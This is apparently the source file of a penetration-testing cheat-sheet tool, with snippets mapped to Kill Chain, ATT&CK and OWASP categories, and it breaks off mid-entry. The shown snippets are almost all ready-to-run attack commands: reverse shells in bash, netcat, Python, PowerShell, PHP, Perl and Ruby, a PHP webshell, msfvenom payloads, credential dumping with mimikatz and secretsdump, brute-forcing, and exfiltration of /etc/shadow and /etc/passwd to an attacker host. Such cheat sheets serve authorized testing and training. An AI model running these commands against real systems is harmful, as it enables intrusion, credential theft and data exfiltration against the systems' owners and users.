// Cyber Ops — Unified security toolkit with Kill Chain, ATT&CK, Pyramid of Pain, OWASP Top 10
// All snippets tagged with team (red/blue), kill chain phase, ATT&CK tactic, pyramid level, OWASP
/* global process */

(function () {
  'use strict';

  // ═══════════════════════════════════════════════════════════
  //  FRAMEWORK DEFINITIONS
  // ═══════════════════════════════════════════════════════════

  const KILL_CHAIN = [
    { id: 'recon',        label: 'Reconnaissance',       desc: 'Harvesting emails, OSINT, scanning, tech fingerprinting' },
    { id: 'weaponize',    label: 'Weaponization',        desc: 'Creating payloads, exploits, and delivery mechanisms' },
    { id: 'delivery',     label: 'Delivery',             desc: 'Transmitting the weapon to the target environment' },
    { id: 'exploitation', label: 'Exploitation',         desc: 'Triggering the payload to exploit a vulnerability' },
    { id: 'installation', label: 'Installation',         desc: 'Installing backdoors, persistence mechanisms' },
    { id: 'c2',           label: 'Command & Control',    desc: 'Establishing a channel for remote control' },
    { id: 'actions',      label: 'Actions on Objectives', desc: 'Achieving the goal: data theft, destruction, lateral movement' },
  ];

  const ATTACK_TACTICS = [
    { id: 'reconnaissance',       label: 'Recon',          code: 'TA0043' },
    { id: 'resource-development',  label: 'Resource Dev',   code: 'TA0042' },
    { id: 'initial-access',       label: 'Initial Access', code: 'TA0001' },
    { id: 'execution',            label: 'Execution',      code: 'TA0002' },
    { id: 'persistence',          label: 'Persistence',    code: 'TA0003' },
    { id: 'privilege-escalation', label: 'Priv Esc',       code: 'TA0004' },
    { id: 'defense-evasion',      label: 'Def Evasion',    code: 'TA0005' },
    { id: 'credential-access',    label: 'Cred Access',    code: 'TA0006' },
    { id: 'discovery',            label: 'Discovery',      code: 'TA0007' },
    { id: 'lateral-movement',     label: 'Lateral Mvmt',   code: 'TA0008' },
    { id: 'collection',           label: 'Collection',     code: 'TA0009' },
    { id: 'command-control',      label: 'C2',             code: 'TA0011' },
    { id: 'exfiltration',         label: 'Exfiltration',   code: 'TA0010' },
    { id: 'impact',               label: 'Impact',         code: 'TA0040' },
  ];

  const PYRAMID_LEVELS = [
    { id: 'ttps',      label: 'TTPs',                  pain: 'Tough!',      painClass: 'pain-tough',     desc: 'Tactics, Techniques & Procedures — forces adversary to retool completely' },
    { id: 'tools',     label: 'Tools',                 pain: 'Challenging', painClass: 'pain-challenge',  desc: 'Software & utilities used — adversary must find or develop new tools' },
    { id: 'artifacts', label: 'Network/Host Artifacts', pain: 'Annoying',   painClass: 'pain-annoying',  desc: 'Behavioral indicators like URI patterns, C2 protocols, registry keys' },
    { id: 'domains',   label: 'Domain Names',          pain: 'Simple',      painClass: 'pain-simple',    desc: 'Adversary domains — easy to change but cost time and effort' },
    { id: 'ips',       label: 'IP Addresses',          pain: 'Easy',        painClass: 'pain-easy',      desc: 'C2 server IPs — trivially rotated by adversary' },
    { id: 'hashes',    label: 'Hash Values',           pain: 'Trivial',     painClass: 'pain-trivial',   desc: 'File hashes — one-bit change defeats this indicator' },
  ];

  const OWASP_TOP10 = [
    { id: 'A01', code: 'A01:2021', label: 'Broken Access Control',   desc: 'Restrictions on authenticated users are not properly enforced' },
    { id: 'A02', code: 'A02:2021', label: 'Cryptographic Failures',  desc: 'Failures related to cryptography leading to sensitive data exposure' },
    { id: 'A03', code: 'A03:2021', label: 'Injection',               desc: 'SQL, NoSQL, OS, LDAP injection when untrusted data is sent to an interpreter' },
    { id: 'A04', code: 'A04:2021', label: 'Insecure Design',         desc: 'Missing or ineffective control design — not implementation bugs but design flaws' },
    { id: 'A05', code: 'A05:2021', label: 'Security Misconfiguration', desc: 'Missing hardening, default configs, open cloud storage, verbose errors' },
    { id: 'A06', code: 'A06:2021', label: 'Vulnerable Components',   desc: 'Using components with known vulnerabilities — libraries, frameworks, OS' },
    { id: 'A07', code: 'A07:2021', label: 'Auth Failures',           desc: 'Authentication and session management weaknesses' },
    { id: 'A08', code: 'A08:2021', label: 'Integrity Failures',      desc: 'Software and data integrity failures — insecure CI/CD, unsigned updates' },
    { id: 'A09', code: 'A09:2021', label: 'Logging & Monitoring',    desc: 'Insufficient logging, detection, monitoring, and active response' },
    { id: 'A10', code: 'A10:2021', label: 'SSRF',                    desc: 'Server-Side Request Forgery — fetching remote resources without validation' },
  ];

  // ═══════════════════════════════════════════════════════════
  //  SNIPPET DATA — 100+ Red & Blue Team Tools
  // ═══════════════════════════════════════════════════════════

  const SNIPPETS = [
    // ── Reconnaissance ───────────────────────────────────
    { id: 'nmap-basic', title: 'Nmap TCP Fast Scan', team: 'red', category: 'recon',
      description: 'Quick full-port scan with default scripts and version detection.',
      tags: ['nmap', 'ports'], command: 'nmap -p- --min-rate 1000 -sC -sV TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: [] },
    { id: 'nmap-udp', title: 'Nmap Top UDP', team: 'red', category: 'recon',
      description: 'Probe common UDP services.',
      tags: ['nmap', 'udp'], command: 'nmap -sU --top-ports 200 TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: [] },
    { id: 'nmap-vuln', title: 'Nmap Vuln Scripts', team: 'red', category: 'recon',
      description: 'Run Nmap vulnerability scanning scripts.',
      tags: ['nmap', 'vuln'], command: 'nmap --script vuln TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'whatweb', title: 'WhatWeb Fingerprint', team: 'red', category: 'recon',
      description: 'Identify web technologies and frameworks.',
      tags: ['whatweb', 'fingerprint'], command: 'whatweb -a 3 https://TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: [] },
    { id: 'amass-enum', title: 'Amass Subdomain Enum', team: 'red', category: 'recon',
      description: 'Passive + active subdomain enumeration.',
      tags: ['amass', 'subdomain', 'osint'], command: 'amass enum -d DOMAIN -passive -o amass_results.txt',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'subfinder', title: 'Subfinder Subdomains', team: 'red', category: 'recon',
      description: 'Fast passive subdomain discovery.',
      tags: ['subfinder', 'subdomain'], command: 'subfinder -d DOMAIN -all -o subdomains.txt',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'theHarvester', title: 'theHarvester OSINT', team: 'red', category: 'recon',
      description: 'Gather emails, names, subdomains from public sources.',
      tags: ['theharvester', 'osint', 'emails'], command: 'theHarvester -d DOMAIN -b all -l 200 -f harvest_results',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'shodan-host', title: 'Shodan Host Lookup', team: 'red', category: 'recon',
      description: 'Query Shodan for open ports and services on a host.',
      tags: ['shodan', 'osint'], command: 'shodan host TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'ips', owasp: [] },
    { id: 'nuclei-scan', title: 'Nuclei Vulnerability Scan', team: 'red', category: 'recon',
      description: 'Template-based vulnerability scanner.',
      tags: ['nuclei', 'vuln'], command: 'nuclei -u https://TARGET -t cves/ -t exposures/ -t misconfigurations/ -o nuclei_results.txt',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05', 'A06'] },

    // ── Web Enumeration & Exploitation ───────────────────
    { id: 'ffuf-dir', title: 'Directory Fuzzing (ffuf)', team: 'red', category: 'web',
      description: 'Enumerate common web paths.',
      tags: ['ffuf', 'fuzz'], command: 'ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403',
      killchain: 'recon', attack: ['reconnaissance', 'initial-access'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'ffuf-vhost', title: 'Virtual Host Fuzzing', team: 'red', category: 'web',
      description: 'Find vhosts behind a single IP.',
      tags: ['ffuf', 'vhost'], command: 'ffuf -u https://TARGET/ -H "Host: FUZZ.DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'gobuster-dir', title: 'Gobuster Dir', team: 'red', category: 'web',
      description: 'Alternative content discovery.',
      tags: ['gobuster'], command: 'gobuster dir -u https://TARGET -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,html',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'feroxbuster', title: 'Feroxbuster Recursive', team: 'red', category: 'web',
      description: 'Fast recursive content discovery.',
      tags: ['feroxbuster', 'fuzz'], command: 'feroxbuster -u https://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'nikto', title: 'Nikto Web Scan', team: 'red', category: 'web',
      description: 'Quick web server misconfiguration scan.',
      tags: ['nikto', 'audit'], command: 'nikto -h https://TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'sqlmap-basic', title: 'SQLMap Basic', team: 'red', category: 'web',
      description: 'Test a parameter for SQL injection.',
      tags: ['sqlmap', 'sqli'], command: 'sqlmap -u "https://TARGET/item.php?id=1" --batch --risk=2 --level=3',
      killchain: 'exploitation', attack: ['initial-access', 'execution'], pyramid: 'ttps', owasp: ['A03'] },
    { id: 'sqlmap-dump', title: 'SQLMap Dump DB', team: 'red', category: 'web',
      description: 'Dump entire database after confirming SQLi.',
      tags: ['sqlmap', 'sqli', 'dump'], command: 'sqlmap -u "https://TARGET/item.php?id=1" --batch --dump-all --output-dir=./sqldump',
      killchain: 'actions', attack: ['collection', 'exfiltration'], pyramid: 'ttps', owasp: ['A03'] },
    { id: 'lfi-basic', title: 'LFI Test', team: 'red', category: 'web',
      description: 'Test for local file inclusion with traversal.',
      tags: ['lfi', 'traversal'], command: 'curl -s "https://TARGET/page.php?file=../../../../etc/passwd"',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A01', 'A03'] },
    { id: 'lfi-filter', title: 'LFI PHP Filter (Base64)', team: 'red', category: 'web',
      description: 'Read PHP source via base64 filter wrapper.',
      tags: ['lfi', 'php'], command: 'curl -s "https://TARGET/page.php?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d',
      killchain: 'exploitation', attack: ['collection'], pyramid: 'ttps', owasp: ['A03'] },
    { id: 'wfuzz-param', title: 'Wfuzz Parameter Discovery', team: 'red', category: 'web',
      description: 'Discover hidden GET parameters.',
      tags: ['wfuzz', 'params'], command: 'wfuzz -u "https://TARGET/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'xss-test', title: 'XSS Probe', team: 'red', category: 'web',
      description: 'Test reflected XSS on parameters.',
      tags: ['xss', 'web'], command: 'curl -s "https://TARGET/search?q=<script>alert(1)</script>" | grep -i "alert"',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A03'] },
    { id: 'ssrf-test', title: 'SSRF Test', team: 'red', category: 'web',
      description: 'Test for server-side request forgery.',
      tags: ['ssrf', 'web'], command: 'curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A10'] },
    { id: 'wpscan', title: 'WPScan WordPress', team: 'red', category: 'web',
      description: 'WordPress vulnerability scanner.',
      tags: ['wpscan', 'wordpress', 'cms'], command: 'wpscan --url https://TARGET --enumerate vp,vt,u --plugins-detection aggressive',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },

    // ── Password Attacks ─────────────────────────────────
    { id: 'hydra-ssh', title: 'Hydra SSH Brute', team: 'red', category: 'passwords',
      description: 'Brute-force SSH login with wordlists.',
      tags: ['hydra', 'ssh', 'brute-force'], command: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'hydra-http-post', title: 'Hydra HTTP POST Login', team: 'red', category: 'passwords',
      description: 'Brute-force web login form.',
      tags: ['hydra', 'http', 'brute-force'], command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid"',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'hashcat-ntlm', title: 'Hashcat NTLM', team: 'red', category: 'passwords',
      description: 'Crack NTLM hashes with hashcat.',
      tags: ['hashcat', 'ntlm', 'cracking'], command: 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },
    { id: 'john-shadow', title: 'John the Ripper (shadow)', team: 'red', category: 'passwords',
      description: 'Crack Linux shadow file hashes.',
      tags: ['john', 'shadow', 'cracking'], command: 'unshadow /etc/passwd /etc/shadow > combined.txt && john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },
    { id: 'crackmapexec-smb', title: 'CrackMapExec SMB', team: 'red', category: 'passwords',
      description: 'Password spray or validate creds against SMB.',
      tags: ['crackmapexec', 'smb', 'spray'], command: 'crackmapexec smb TARGET -u users.txt -p passwords.txt --continue-on-success',
      killchain: 'exploitation', attack: ['credential-access', 'lateral-movement'], pyramid: 'tools', owasp: ['A07'] },
    { id: 'hashcat-rules', title: 'Hashcat with Rules', team: 'red', category: 'passwords',
      description: 'Rule-based password cracking for complex passwords.',
      tags: ['hashcat', 'rules', 'cracking'], command: 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },

    // ── Active Directory ─────────────────────────────────
    { id: 'bloodhound-collect', title: 'BloodHound Collection', team: 'red', category: 'ad',
      description: 'Collect AD data with bloodhound-python.',
      tags: ['bloodhound', 'ad', 'enum'], command: 'bloodhound-python -d DOMAIN -u USER -p PASS -c All -ns TARGET',
      killchain: 'recon', attack: ['discovery', 'reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'impacket-secretsdump', title: 'Impacket secretsdump', team: 'red', category: 'ad',
      description: 'Dump SAM/LSA/NTDS secrets remotely.',
      tags: ['impacket', 'secretsdump', 'dump'], command: 'impacket-secretsdump DOMAIN/USER:PASS@TARGET',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'tools', owasp: [] },
    { id: 'impacket-psexec', title: 'Impacket PsExec', team: 'red', category: 'ad',
      description: 'Remote shell via PsExec-like SMB execution.',
      tags: ['impacket', 'psexec', 'lateral'], command: 'impacket-psexec DOMAIN/USER:PASS@TARGET',
      killchain: 'actions', attack: ['lateral-movement', 'execution'], pyramid: 'tools', owasp: [] },
    { id: 'impacket-wmiexec', title: 'Impacket WMI Exec', team: 'red', category: 'ad',
      description: 'Remote shell via WMI.',
      tags: ['impacket', 'wmiexec', 'lateral'], command: 'impacket-wmiexec DOMAIN/USER:PASS@TARGET',
      killchain: 'actions', attack: ['lateral-movement', 'execution'], pyramid: 'tools', owasp: [] },
    { id: 'evil-winrm', title: 'Evil-WinRM', team: 'red', category: 'ad',
      description: 'WinRM shell with file upload/download.',
      tags: ['evil-winrm', 'winrm'], command: 'evil-winrm -i TARGET -u USER -p PASS',
      killchain: 'actions', attack: ['lateral-movement', 'execution'], pyramid: 'tools', owasp: [] },
    { id: 'kerbrute-userenum', title: 'Kerbrute User Enum', team: 'red', category: 'ad',
      description: 'Enumerate valid AD users via Kerberos pre-auth.',
      tags: ['kerbrute', 'kerberos', 'enum'], command: 'kerbrute userenum -d DOMAIN --dc TARGET users.txt',
      killchain: 'recon', attack: ['reconnaissance', 'credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'getnpusers', title: 'AS-REP Roasting', team: 'red', category: 'ad',
      description: 'Get TGTs for accounts without pre-auth.',
      tags: ['impacket', 'asreproast', 'kerberos'], command: 'impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip TARGET -format hashcat -outputfile asrep.txt',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'getuserspns', title: 'Kerberoasting', team: 'red', category: 'ad',
      description: 'Request service tickets for offline cracking.',
      tags: ['impacket', 'kerberoast', 'kerberos'], command: 'impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip TARGET -request -outputfile kerberoast.txt',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'enum4linux', title: 'Enum4Linux-ng', team: 'red', category: 'ad',
      description: 'Enumerate SMB/RPC shares, users, groups.',
      tags: ['enum4linux', 'smb', 'enum'], command: 'enum4linux-ng -A TARGET',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'ldapsearch', title: 'LDAP Search', team: 'red', category: 'ad',
      description: 'Query LDAP directory for users and objects.',
      tags: ['ldap', 'enum'], command: 'ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w PASS -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'responder', title: 'Responder (LLMNR/NBT-NS)', team: 'red', category: 'ad',
      description: 'Capture NTLMv2 hashes on the local network.',
      tags: ['responder', 'llmnr', 'ntlm'], command: 'responder -I eth0 -dwP',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'mimikatz-logonpasswords', title: 'Mimikatz Logon Passwords', team: 'red', category: 'ad',
      description: 'Dump plaintext credentials from memory.',
      tags: ['mimikatz', 'credentials'], command: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'tools', owasp: [] },
    { id: 'pth-evil-winrm', title: 'Pass-the-Hash', team: 'red', category: 'ad',
      description: 'Authenticate with NTLM hash instead of password.',
      tags: ['evil-winrm', 'pth', 'lateral'], command: 'evil-winrm -i TARGET -u Administrator -H NTHASH',
      killchain: 'actions', attack: ['lateral-movement'], pyramid: 'ttps', owasp: [] },

    // ── Shells ───────────────────────────────────────────
    { id: 'python-rev', title: 'Python Reverse Shell', team: 'red', category: 'shells',
      description: 'Python one-liner reverse shell.',
      tags: ['reverse-shell', 'python'], command: 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\'',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'bash-rev', title: 'Bash Reverse Shell', team: 'red', category: 'shells',
      description: 'Bash TCP reverse shell.',
      tags: ['reverse-shell', 'bash'], command: 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'nc-rev', title: 'Netcat Reverse Shell', team: 'red', category: 'shells',
      description: 'nc reverse shell with mkfifo fallback.',
      tags: ['reverse-shell', 'nc'], command: 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'artifacts', owasp: [] },
    { id: 'powershell-rev', title: 'PowerShell Reverse Shell', team: 'red', category: 'shells',
      description: 'Windows PowerShell reverse shell.',
      tags: ['reverse-shell', 'powershell'], command: '$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'artifacts', owasp: [] },
    { id: 'tty-upgrade', title: 'TTY Upgrade', team: 'red', category: 'post',
      description: 'Upgrade dumb shell to interactive TTY.',
      tags: ['tty', 'post-exploitation'], command: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm-256color',
      killchain: 'installation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'php-rev', title: 'PHP Reverse Shell', team: 'red', category: 'shells',
      description: 'PHP one-liner reverse shell for web servers.',
      tags: ['reverse-shell', 'php'], command: 'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'ruby-rev', title: 'Ruby Reverse Shell', team: 'red', category: 'shells',
      description: 'Ruby reverse shell one-liner.',
      tags: ['reverse-shell', 'ruby'], command: 'ruby -rsocket -e \'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'perl-rev', title: 'Perl Reverse Shell', team: 'red', category: 'shells',
      description: 'Perl reverse shell — works on many legacy systems.',
      tags: ['reverse-shell', 'perl'], command: 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'web-shell-cmd', title: 'PHP Command Shell', team: 'red', category: 'shells',
      description: 'Simple PHP webshell for command execution.',
      tags: ['webshell', 'php'], command: 'echo \'<?php if(isset($_GET["c"])){echo "<pre>".shell_exec($_GET["c"])."</pre>";}?>\' > cmd.php\n# Usage: https://TARGET/cmd.php?c=id',
      killchain: 'exploitation', attack: ['execution', 'persistence'], pyramid: 'ttps', owasp: ['A03'] },
    { id: 'socat-rev', title: 'Socat Encrypted Rev Shell', team: 'red', category: 'shells',
      description: 'Reverse shell with TLS encryption via socat.',
      tags: ['reverse-shell', 'socat', 'encrypted'], command: '# Generate cert:\nopenssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1 -out bind.crt\ncat bind.key bind.crt > bind.pem\n# Listener:\nsocat OPENSSL-LISTEN:LPORT,cert=bind.pem,reuseaddr,fork EXEC:/bin/bash\n# Target:\nsocat OPENSSL:LHOST:LPORT,verify=0 EXEC:/bin/bash',
      killchain: 'exploitation', attack: ['execution', 'command-control'], pyramid: 'ttps', owasp: [] },

    // ── Payload Generation ───────────────────────────────
    { id: 'msfvenom-linux', title: 'Msfvenom Linux ELF', team: 'red', category: 'payloads',
      description: 'Generate a staged Linux Meterpreter binary.',
      tags: ['msfvenom', 'linux', 'meterpreter'], command: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'msfvenom-windows', title: 'Msfvenom Windows EXE', team: 'red', category: 'payloads',
      description: 'Generate a staged Windows Meterpreter EXE.',
      tags: ['msfvenom', 'windows', 'meterpreter'], command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'msfvenom-aspx', title: 'Msfvenom ASPX', team: 'red', category: 'payloads',
      description: 'Generate an ASPX webshell for IIS.',
      tags: ['msfvenom', 'aspx', 'webshell'], command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f aspx -o shell.aspx',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'msfvenom-php', title: 'Msfvenom PHP', team: 'red', category: 'payloads',
      description: 'Generate a PHP reverse shell payload.',
      tags: ['msfvenom', 'php', 'webshell'], command: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f raw -o shell.php',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'listener-nc', title: 'Netcat Listener', team: 'red', category: 'payloads',
      description: 'Start a netcat catch-all listener.',
      tags: ['nc', 'listener'], command: 'nc -lvnp LPORT',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'listener-rlwrap', title: 'Rlwrap Listener', team: 'red', category: 'payloads',
      description: 'Listener with readline support for arrow keys.',
      tags: ['rlwrap', 'nc', 'listener'], command: 'rlwrap nc -lvnp LPORT',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'listener-multi-handler', title: 'Metasploit Handler', team: 'red', category: 'payloads',
      description: 'MSF multi-handler for staged payloads.',
      tags: ['metasploit', 'handler'], command: 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT LPORT; exploit"',
      killchain: 'c2', attack: ['command-control'], pyramid: 'tools', owasp: [] },

    // ── Receivers, Servers & Catchers ────────────────────
    { id: 'http-upload-server', title: 'HTTP Upload Server', team: 'red', category: 'receivers',
      description: 'Python HTTP server that accepts file uploads (PUT + POST multipart).',
      tags: ['python', 'http-server', 'upload', 'receiver'], command: 'python3 -c "\nimport http.server, os\nclass H(http.server.SimpleHTTPRequestHandler):\n  def do_PUT(self):\n    path = self.translate_path(self.path)\n    length = int(self.headers[\'Content-Length\'])\n    with open(path, \'wb\') as f: f.write(self.rfile.read(length))\n    self.send_response(201); self.end_headers()\n  do_POST = do_PUT\nhttp.server.HTTPServer((\'0.0.0.0\', 8000), H).serve_forever()\n"\n# Upload from target: curl -X PUT https://LHOST:8000/loot.txt -d @/etc/passwd',
      killchain: 'c2', attack: ['command-control', 'exfiltration'], pyramid: 'ips', owasp: [] },
    { id: 'https-server', title: 'HTTPS Server (self-signed)', team: 'red', category: 'receivers',
      description: 'Quick HTTPS server with self-signed cert for encrypted delivery.',
      tags: ['python', 'https', 'ssl', 'receiver'], command: '# Generate cert:\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=LHOST"\n# Serve:\npython3 -c "\nimport http.server, ssl\nctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\nctx.load_cert_chain(\'cert.pem\', \'key.pem\')\nwith http.server.HTTPServer((\'0.0.0.0\', 443), http.server.SimpleHTTPRequestHandler) as srv:\n  srv.socket = ctx.wrap_socket(srv.socket, server_side=True)\n  srv.serve_forever()\n"',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'php-server', title: 'PHP Dev Server', team: 'red', category: 'receivers',
      description: 'Built-in PHP server — great for testing PHP shells and webshells.',
      tags: ['php', 'http-server', 'receiver'], command: 'php -S 0.0.0.0:8080 -t .',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'ruby-http-server', title: 'Ruby HTTP Server', team: 'red', category: 'receivers',
      description: 'One-liner Ruby HTTP file server.',
      tags: ['ruby', 'http-server', 'receiver'], command: 'ruby -run -e httpd -- -p 8000 .',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'updog', title: 'Updog Upload Server', team: 'red', category: 'receivers',
      description: 'HTTP/HTTPS file server with upload support and auth.',
      tags: ['updog', 'http-server', 'upload', 'receiver'], command: 'updog -p 8000\n# With SSL and password:\nupdog -p 443 --ssl --password s3cr3t',
      killchain: 'c2', attack: ['command-control', 'exfiltration'], pyramid: 'tools', owasp: [] },
    { id: 'ftp-server', title: 'FTP Server (pyftpdlib)', team: 'red', category: 'receivers',
      description: 'Quick anonymous FTP server for file transfer.',
      tags: ['python', 'ftp', 'receiver'], command: 'python3 -m pyftpdlib -p 21 -w\n# With auth:\npython3 -m pyftpdlib -p 21 -u admin -P pass -w',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'webdav-server', title: 'WebDAV Server', team: 'red', category: 'receivers',
      description: 'WebDAV server for Windows file transfer (net use \\\\LHOST\\share).',
      tags: ['webdav', 'impacket', 'receiver'], command: '# Impacket WebDAV:\nwsgidav --host 0.0.0.0 --port 80 --root /tmp/share --auth anonymous\n# On Windows target:\nnet use Z: https://LHOST/share\ncopy C:\\secrets.txt Z:\\',
      killchain: 'c2', attack: ['command-control', 'exfiltration'], pyramid: 'tools', owasp: [] },
    { id: 'nc-file-receiver', title: 'Netcat File Receiver', team: 'red', category: 'receivers',
      description: 'Catch a single file sent via netcat.',
      tags: ['nc', 'receiver', 'exfiltration'], command: '# Receiver (attacker):\nnc -lvnp 9001 > received_file\n# Sender (target):\nnc LHOST 9001 < /etc/shadow\n# or with cat:\ncat /etc/passwd | nc LHOST 9001',
      killchain: 'actions', attack: ['exfiltration'], pyramid: 'ips', owasp: [] },
    { id: 'interactsh', title: 'Interactsh OOB Server', team: 'red', category: 'receivers',
      description: 'Out-of-band interaction server — catches DNS, HTTP, SMTP, LDAP callbacks. Perfect for blind SSRF/XXE/RCE.',
